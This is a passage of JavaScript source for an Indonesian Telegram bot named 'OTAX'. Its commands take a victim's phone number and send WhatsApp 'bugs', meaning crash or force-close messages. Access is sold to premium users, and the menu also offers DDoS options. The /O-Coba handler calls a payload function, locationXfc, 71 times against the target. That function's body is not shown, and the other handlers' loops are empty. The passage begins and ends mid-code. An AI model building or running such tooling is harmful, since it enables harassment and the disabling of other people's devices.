replyMarkup = { inline_keyboard: [[{ text: "𝙺𝙴𝙼𝙱𝙰𝙻𝙸 ツ", callback_data: "back_to_main" }]] };
      replyMarkup = {
        inline_keyboard: [
        [{ text: "𝙿𝙴𝙽𝙶𝙰𝚃𝚄𝚁𝙰𝙽 ✘", callback_data: "setting" }, { text: "𝙾𝚆𝙽𝙴𝚁 ✘", callback_data: "owner_menu" }, { text: "𝚃𝚀𝚃𝙾 ✘", callback_data: "tqto" }],
        [{ text: "𝙳𝙳𝙾𝚂 ✘", callback_data: "ddos" }, { text: "𝚃𝙾𝙾𝙻𝚂 ✘", callback_data: "tools" }],
        [{ text: "𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘", callback_data: "trashmenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/4v8phs.png",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
})

//=======CASE BUG=========//

bot.onText(/\/O-Coba (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 70; i++) {
      await locationXfc(isTarget);
      await sleep(1000);
      }
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Visiblefc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  const jid = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
for (let i = 0; i <= 20; i++) {
      
      }
  
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Fc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
for (let i = 0; i <= 25; i++) {
      
      }
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Invis (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 70; i++) {
      
      }
console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Ios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
